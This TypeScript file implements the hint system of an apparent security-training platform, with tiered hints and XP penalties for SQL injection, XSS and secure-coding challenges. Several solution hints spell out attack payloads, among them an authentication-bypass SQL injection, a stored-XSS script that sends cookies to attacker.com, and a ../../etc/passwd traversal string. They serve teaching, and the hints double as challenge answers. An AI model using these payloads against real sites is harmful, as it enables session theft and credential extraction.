/**
 * Hint system with XP penalty.
 * Progressive hints that reduce max XP for a challenge.
 */

export type HintLevel = 1 | 2 | 3;

export interface Hint {
  level: HintLevel;
  text: string;
  xpReduction: number; // percentage of XP reduced
}

/**
 * XP reduction per hint level:
 * Level 1: 10% reduction
 * Level 2: 25% reduction
 * Level 3: 50% reduction
 */
export const HINT_XP_PENALTY: Record<HintLevel, number> = {
  1: 0.10,
  2: 0.25,
  3: 0.50,
};

const DEFAULT_HINTS: Hint[] = [
  {
    level: 1,
    text: `Think about what vulnerability this task is testing. Review the relevant module materials.`,
    xpReduction: HINT_XP_PENALTY[1],
  },
  {
    level: 2,
    text: `Look at the code carefully. Pay attention to input validation, output encoding, and authentication checks.`,
    xpReduction: HINT_XP_PENALTY[2],
  },
  {
    level: 3,
    text: `The answer involves understanding how the data flows through the application. Trace the input from entry point to output.`,
    xpReduction: HINT_XP_PENALTY[3],
  },
];

const HINT_MAP: Record<string, Hint[]> = {
    'owasp-c1': [
      { level: 1 as HintLevel, text: 'This is about injection attacks. What kind of data does the application accept from users?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Check if the application uses prepared statements or concatenates user input directly into queries.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'The vulnerability allows an attacker to execute arbitrary SQL commands by manipulating the search field input.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'owasp-c2': [
      { level: 1 as HintLevel, text: 'This challenge focuses on broken authentication. How does the application verify user identity?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Look at the session management and password recovery mechanisms.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'The application exposes session tokens in URLs and allows unlimited login attempts without rate limiting.', xpReduction: HINT_XP_PENALTY[3] },
    ],

    'beginner-1': [
      { level: 1 as HintLevel, text: 'Try to break out of the SQL string using a single quote character (\').', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Use a UNION SELECT statement to retrieve data from other tables.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Inject: \' OR 1=1 -- to bypass authentication, then use UNION SELECT to extract user credentials from the users table.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'intermediate-1': [
      { level: 1 as HintLevel, text: 'This is a blind SQL injection. The application does not show database errors directly.', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Use boolean-based or time-based techniques to infer information about the database structure.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Apply the SUBSTRING and SLEEP functions to extract data character by character using time delays.', xpReduction: HINT_XP_PENALTY[3] },
    ],

    'reflected': [
      { level: 1 as HintLevel, text: 'The input is reflected directly in the page without proper escaping.', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Try injecting a script tag with an alert function to confirm the vulnerability.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Submit: &lt;script&gt;alert(\'XSS\')&lt;/script&gt; in the search field.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'stored': [
      { level: 1 as HintLevel, text: 'The input is saved to the database and displayed to all users who view the page.', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Use the comment form to inject a persistent script that executes whenever the page loads.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Post a comment containing: &lt;script&gt;document.location=\'http://attacker.com/?cookie=\'+document.cookie&lt;/script&gt;', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-1': [
      { level: 1 as HintLevel, text: 'This endpoint accepts user input and inserts it directly into a database query. What could go wrong?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Look at how req.params.id is used — it is concatenated directly into the SQL string without any escaping.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Use parameterized queries (prepared statements) with placeholders instead of string concatenation to prevent SQL injection.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-2': [
      { level: 1 as HintLevel, text: 'The code saves user data — look at how the password field is handled before storage.', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'The password is saved as-is. Base64 is an encoding, not encryption — it is trivially reversible.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Hash passwords using bcrypt with a unique salt before storing in the database. Never store plaintext passwords.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-3': [
      { level: 1 as HintLevel, text: 'This function displays user-supplied text in the DOM. How is the text inserted?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'innerHTML interprets HTML tags. If the query string contains &lt;script&gt; tags, the code will execute.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Use textContent instead of innerHTML — it inserts text as plain text, encoding special characters automatically.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-4': [
      { level: 1 as HintLevel, text: 'This endpoint performs a destructive action. Who is allowed to call it?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'There are no authentication or authorization checks — anyone can send a request and delete any user record.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Add authentication middleware that verifies the caller\'s identity and checks that they have permission to perform the action.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-5': [
      { level: 1 as HintLevel, text: 'What information does the error response expose to the client?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'The full stack trace reveals file paths, library versions, and the application\'s internal directory structure.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'In production, return a generic error message to the client and log the detailed error server-side only.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-6': [
      { level: 1 as HintLevel, text: 'The endpoint serves files based on a user-supplied filename. What could go wrong?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'A filename like ../../etc/passwd could navigate outside the uploads directory and read system files.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Validate the filename (reject ../ and absolute paths), use path.resolve, and verify the resolved path stays within the allowed directory.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-7': [
      { level: 1 as HintLevel, text: 'The code processes user-supplied data to dynamically create objects. How is it doing this?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'eval() executes arbitrary JavaScript code. If profile.type contains malicious code, it runs with full server privileges.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Use schema validation libraries (Zod, Joi) to validate and parse user input. Never use eval() with user-supplied data.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-8': [
      { level: 1 as HintLevel, text: 'This endpoint reads a balance, then writes it. What happens with two concurrent requests?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'Between the read and the write, another request could read the same old balance — leading to a double-spend.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Use database transactions with row-level locking (e.g., SELECT FOR UPDATE) to make the read-check-write atomic.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-9': [
      { level: 1 as HintLevel, text: 'The endpoint redirects the user to a URL from the query string. Where could that URL point?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'An attacker can craft a link that looks like your domain but redirects to a phishing site — an Open Redirect attack.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Only redirect to relative/internal URLs, or maintain a whitelist of allowed external domains for redirects.', xpReduction: HINT_XP_PENALTY[3] },
    ],
    'sc-10': [
      { level: 1 as HintLevel, text: 'The endpoint accepts file uploads. How does it validate what files are uploaded?', xpReduction: HINT_XP_PENALTY[1] },
      { level: 2 as HintLevel, text: 'An attacker could upload a .php or .js file and execute it directly on the server — there is no validation at all.', xpReduction: HINT_XP_PENALTY[2] },
      { level: 3 as HintLevel, text: 'Validate MIME type, file extension, and size. Generate unique filenames. Store uploads outside the web-root directory.', xpReduction: HINT_XP_PENALTY[3] },
    ],
}

/**
 * Calculate the maximum XP reduction from a set of revealed hint levels.
 * Returns a multiplier (0-1) where 1 = no penalty, 0.5 = 50% reduction.
 */
export function calculateHintPenalty(revealedLevels: Set<HintLevel>): number {
  if (revealedLevels.size === 0) return 1;
  let maxPenalty = 0;
  for (const level of revealedLevels) {
    maxPenalty = Math.max(maxPenalty, HINT_XP_PENALTY[level]);
  }
  return 1 - maxPenalty;
}

/**
 * Generate hints for a specific challenge/task.
 * @param taskKey - Unique identifier for the task
 * @returns Array of hints from general to specific
 */
export function getHints(taskKey: string): Hint[] {
  return HINT_MAP[taskKey] || DEFAULT_HINTS;
}

/**
 * Get the hint level description for display.
 */
export function getHintLevelLabel(level: HintLevel): string {
  const labels: Record<HintLevel, string> = {
    1: 'General hint',
    2: 'Specific hint',
    3: 'Solution hint',
  };
  return labels[level];
}
